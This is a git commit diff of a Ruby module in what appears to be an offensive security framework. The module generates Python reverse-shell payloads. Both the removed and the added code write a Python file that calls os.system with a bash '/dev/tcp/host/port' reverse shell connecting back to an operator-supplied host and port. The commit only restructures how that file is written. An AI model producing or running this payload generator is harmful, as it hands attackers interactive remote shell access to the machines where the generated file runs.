b9c482ff9b8edc609f795792e7ee2a47eb0c92dd
Ivan Nikolsky <enty8080@gmail.com>
2020-11-13 22:17:11 +0300

    Update python.rb

--- modules/payload/python.rb
+++ modules/payload/python.rb
@@ -1,15 +1,9 @@
 #!/usr/bin/env ruby
 
-i = "\033[1;77m[i] \033[0m"
-e = "\033[1;31m[-] \033[0m"
-p = "\033[1;77m[>] \033[0m"
-g = "\033[1;34m[*] \033[0m"
-s = "\033[1;32m[+] \033[0m"
-h = "\033[1;77m[@] \033[0m"
-r = "\033[1;77m[#] \033[0m"
-
 require 'optparse'
 require 'ostruct'
+
+require 'core/payloads'
 
 Signal.trap("INT") {
     abort()
@@ -50,63 +44,10 @@ if not host or not port or not shell or not file
     puts "  --output-path=<output_path>    Output path."
     abort()
 end
-  
-if File.directory? file
-    if File.exists? file
-        if file[-1] == "/"
-            file = "#{file}payload.py"
-            sleep(0.5)
-            puts "#{g}Creating payload..."
-            sleep(1)
-            puts "#{g}Saving to #{file}..."
-            sleep(0.5)
-            open(file, 'w') { |f|
-                f.puts "import os"
-                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\")"
-            }
-            puts "#{s}Saved to #{file}!"
-        else
-            file = "#{file}/payload.py"
-            sleep(0.5)
-            puts "#{g}Creating payload..."
-            sleep(1)
-            puts "#{g}Saving to #{file}..."
-            sleep(0.5)
-            open(file, 'w') { |f|
-                f.puts "import os"
-                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\")"
-            }
-            puts "#{s}Saved to #{file}!"
-        end
-    else
-        puts "#{e}Output directory: #{file}: does not exist!"
-        abort()
-    end
-else
-    direct = File.dirname(file)
-    if direct == ""
-        direct = "."
-    else
-        nil
-    end
-    if File.exists? direct
-        if File.directory? direct
-            sleep(0.5)
-            puts "#{g}Creating payload..."
-            sleep(1)
-            puts "#{g}Saving to #{file}..."
-            sleep(0.5)
-            open(file, 'w') { |f|
-                f.puts "import os"
-                f.puts "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\")"
-            }
-            puts "#{s}Saved to #{file}!"
-        else
-            puts "#{e}Error: #{direct}: not a directory!"
-            abort()
-        end
-    else
-        puts "#{e}Output directory: #{direct}: does not exist!"
-        abort()
-    end
-end
+
+payload = ""
+payload += "import os\n"
+payload += "os.system(\"#{shell} -i &> /dev/tcp/#{host}/#{port} 0>&1\")\n"
+
+payload_handler = payloads.new
+payloads.generate_payload(file, payload)
